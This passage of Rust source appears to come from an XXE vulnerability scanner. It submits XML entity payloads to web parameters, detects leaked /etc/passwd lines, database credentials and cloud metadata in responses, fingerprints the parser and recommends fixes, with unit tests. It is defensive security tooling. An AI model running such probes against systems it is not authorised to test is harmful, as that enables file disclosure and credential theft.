        for (payload, _target, signature) in XLSX_PAYLOADS.iter().chain(DOCX_PAYLOADS) {
            let upload_params = &["file", "document", "upload", "import"];

            for param in upload_params {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::FileReadDtd, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check RSS/Atom feed XXE
    async fn check_feeds(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in FEED_PAYLOADS {
            for param in &["feed", "rss", "atom", "xml", "data"] {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::FileRead, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Test XXE payload via parameter
    async fn test_xxe_payload(
        &self,
        url: &str,
        param: &str,
        payload: &str,
        technique: XxeTechnique,
        signature: Option<&str>,
    ) -> Result<Option<Vuln>> {
        let test_url = if url.contains('?') {
            format!("{}&{}={}", url, param, urlencoding::encode(payload))
        } else {
            format!("{}?{}={}", url, param, urlencoding::encode(payload))
        };

        self.test_xxe_direct(&test_url, payload, technique, signature).await
    }

    /// Test XXE payload directly
    async fn test_xxe_direct(
        &self,
        url: &str,
        payload: &str,
        technique: XxeTechnique,
        signature: Option<&str>,
    ) -> Result<Option<Vuln>> {
        let start = Instant::now();

        // Try GET request
        if let Ok(response) = self.client.get(url).header("Content-Type", "application/xml").send().await {
            if let Ok(text) = response.text().await {
                let duration = start.elapsed();
                let text_lower = text.to_lowercase();

                if let Some(sig) = signature {
                    if !sig.is_empty() && (text.contains(sig) || text_lower.contains(&sig.to_lowercase())) {
                        return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                    }
                }

                if self.check_xxe_indicators(&text, &text_lower, &technique) {
                    return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                }
            }
        }

        // Try POST request with application/xml
        let payload_owned = payload.to_string();
        if let Ok(response) = self.client.post(url).header("Content-Type", "application/xml").body(payload_owned.clone()).send().await {
            if let Ok(text) = response.text().await {
                let duration = start.elapsed();
                let text_lower = text.to_lowercase();

                if let Some(sig) = signature {
                    if !sig.is_empty() && (text.contains(sig) || text_lower.contains(&sig.to_lowercase())) {
                        return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                    }
                }

                if self.check_xxe_indicators(&text, &text_lower, &technique) {
                    return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                }
            }
        }

        // Try POST request with text/xml
        if let Ok(response) = self.client.post(url).header("Content-Type", "text/xml").body(payload_owned).send().await {
            if let Ok(text) = response.text().await {
                let duration = start.elapsed();
                let text_lower = text.to_lowercase();

                if let Some(sig) = signature {
                    if !sig.is_empty() && (text.contains(sig) || text_lower.contains(&sig.to_lowercase())) {
                        return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                    }
                }

                if self.check_xxe_indicators(&text, &text_lower, &technique) {
                    return Ok(Some(self.create_vuln(technique, url, &text, duration)));
                }
            }
        }

        Ok(None)
    }

    /// Check response for XXE vulnerability indicators
    fn check_xxe_indicators(&self, text: &str, text_lower: &str, technique: &XxeTechnique) -> bool {
        // File content indicators
        if text.contains("root:") || text.contains("/bin/bash") || text.contains("/usr/sbin") {
            return true;
        }

        // Windows file indicators
        if text.contains("[extensions]") || text.contains("[fonts]") || text.contains("for 16-bit app support") {
            return true;
        }

        // Config file indicators
        if text.contains("DB_PASSWORD") || text.contains("DATABASE_URL") || text.contains("<?php") {
            return true;
        }

        // AWS metadata indicators
        if text.contains("ami-id") || text.contains("instance-id") || text.contains("iam/") {
            return true;
        }

        // GCP metadata indicators
        if text.contains("instance/") || text.contains("computeMetadata") {
            return true;
        }

        // Error messages indicating XML parsing
        if text_lower.contains("xml") && (text_lower.contains("entity") || text_lower.contains("dtd")) {
            return true;
        }

        // Parser-specific error messages
        if text_lower.contains("libxml") || text_lower.contains("sax") || text_lower.contains("documentbuilder") {
            return true;
        }

        // Time-based detection for blind XXE
        if matches!(technique, XxeTechnique::SsrfHttp | XxeTechnique::BlindOob) {
            // Check for common SSRF responses
            if text_lower.contains("<html") || text_lower.contains("ssh-") || text_lower.contains("http/") {
                return true;
            }
        }

        false
    }

    /// Create vulnerability finding
    fn create_vuln(&self, technique: XxeTechnique, location: &str, response: &str, duration: Duration) -> Vuln {
        let parser = self.fingerprint_parser(response);

        Vuln {
            severity: technique.severity(),
            title: format!("XXE Injection: {}", technique.description()),
            description: format!(
                "XML External Entity vulnerability detected. {}\n\nParser fingerprinted as: {}{}",
                technique.description(),
                parser.description(),
                if duration.as_millis() > 1000 {
                    format!("\nResponse time: {}ms (may indicate blind XXE)", duration.as_millis())
                } else {
                    String::new()
                }
            ),
            location: Some(location.to_string()),
            recommendation: Some(match parser {
                XmlParser::Libxml2 => "Disable libxml2 external entities: libxml_disable_entity_loader(true). Use LIBXML_NONET option.",
                XmlParser::JavaSax => "Disable DTDs: DocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)",
                XmlParser::DotNet => "Use XmlReader with XmlResolver set to null. Avoid XmlDocument.",
                XmlParser::PythonElementTree => "Replace with defusedxml. Never use xml.etree with untrusted input.",
                XmlParser::GoXml => "Ensure Go 1.17+ for XXE protection. Avoid older versions.",
                _ => "Disable external entities in XML parser. Use safe alternatives like defusedxml. Never parse untrusted XML with DTDs enabled."
            }.to_string()),
            cwe: Some("CWE-611".to_string()),
            owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
        }
    }

    /// Fingerprint XML parser from response characteristics
    fn fingerprint_parser(&self, response: &str) -> XmlParser {
        let response_lower = response.to_lowercase();

        // libxml2 errors
        if response_lower.contains("libxml") || response_lower.contains("xmlparseerror") {
            return XmlParser::Libxml2;
        }

        // Java errors
        if response_lower.contains("saxparseexception") || response_lower.contains("documentbuilder")
            || response_lower.contains("wstx") || response_lower.contains("woodstox")
            || response_lower.contains("aelfred") || response_lower.contains("kxml") {
            return XmlParser::JavaSax;
        }

        // .NET errors
        if response_lower.contains("'<' is an unexpected token") || response_lower.contains("xml.xmlexception")
            || response_lower.contains("system.xml") || response_lower.contains("xmldocument") {
            return XmlParser::DotNet;
        }

        // Python errors
        if response_lower.contains("notwellformederror") || response_lower.contains("parseerror")
            || response_lower.contains("expaterror") || response_lower.contains("lxml") {
            if response_lower.contains("defusedxml") || response_lower.contains("entitiesareforbidden") {
                return XmlParser::PythonDefusedxml;
            }
            return XmlParser::PythonElementTree;
        }

        // PHP errors
        if response_lower.contains("simplexml_load")
            || response_lower.contains("domdocument")
            || response_lower.contains("warning: simplexml")
        {
            return XmlParser::PhpSimplexml;
        }

        // Go errors
        if response_lower.contains("xml syntax error") || response_lower.contains("encoding/xml") {
            return XmlParser::GoXml;
        }

        // JavaScript/DOMParser errors
        if response_lower.contains("domparser") || response_lower.contains("syntaxerror") {
            return XmlParser::JsDomparser;
        }

        XmlParser::Unknown
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = XxeScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_payloads_loaded() {
        assert!(!FILE_READ_PAYLOADS.is_empty());
        assert!(FILE_READ_PAYLOADS.len() > 10);

        assert!(!SSRF_PAYLOADS.is_empty());
        assert!(!DOS_PAYLOADS.is_empty());
        assert!(!SVG_PAYLOADS.is_empty());
    }

    #[test]
    fn test_technique_severity() {
        assert_eq!(XxeTechnique::FileRead.severity(), VulnSeverity::Critical);
        assert_eq!(XxeTechnique::SsrfHttp.severity(), VulnSeverity::High);
        assert_eq!(XxeTechnique::BillionLaughs.severity(), VulnSeverity::Medium);
    }

    #[test]
    fn test_parser_fingerprint() {
        let config = ScannerConfig::new();
        let scanner = XxeScanner::new(config);

        // libxml2
        assert_eq!(scanner.fingerprint_parser("libxml error"), XmlParser::Libxml2);
        assert_eq!(scanner.fingerprint_parser("XMLParseError"), XmlParser::Libxml2);

        // Java
        assert_eq!(scanner.fingerprint_parser("SAXParseException"), XmlParser::JavaSax);
        assert_eq!(scanner.fingerprint_parser("DocumentBuilder"), XmlParser::JavaSax);

        // .NET
        assert_eq!(scanner.fingerprint_parser("'<' is an unexpected token"), XmlParser::DotNet);
        assert_eq!(scanner.fingerprint_parser("System.Xml"), XmlParser::DotNet);

        // Python
        assert_eq!(scanner.fingerprint_parser("NotWellFormedError"), XmlParser::PythonElementTree);
        assert_eq!(scanner.fingerprint_parser("defusedxml"), XmlParser::PythonDefusedxml);
    }

    #[test]
    fn test_xxe_indicators() {
        let config = ScannerConfig::new();
        let scanner = XxeScanner::new(config);

        // Unix file content
        assert!(scanner.check_xxe_indicators("root:x:0:0:root:/root:/bin/bash", "root:x:0:0", &XxeTechnique::FileRead));

        // Windows file content
        assert!(scanner.check_xxe_indicators("[extensions]\n[fonts]", "[extensions]\n[fonts]", &XxeTechnique::FileRead));

        // AWS metadata
        assert!(scanner.check_xxe_indicators("ami-id-12345", "ami-id-12345", &XxeTechnique::SsrfHttp));
    }

    #[test]
    fn test_parser_vulnerability() {
        assert!(XmlParser::Libxml2.is_vulnerable());
        assert!(XmlParser::JavaSax.is_vulnerable());
        assert!(!XmlParser::PythonDefusedxml.is_vulnerable());
        assert!(!XmlParser::JsDomparser.is_vulnerable());
    }
}
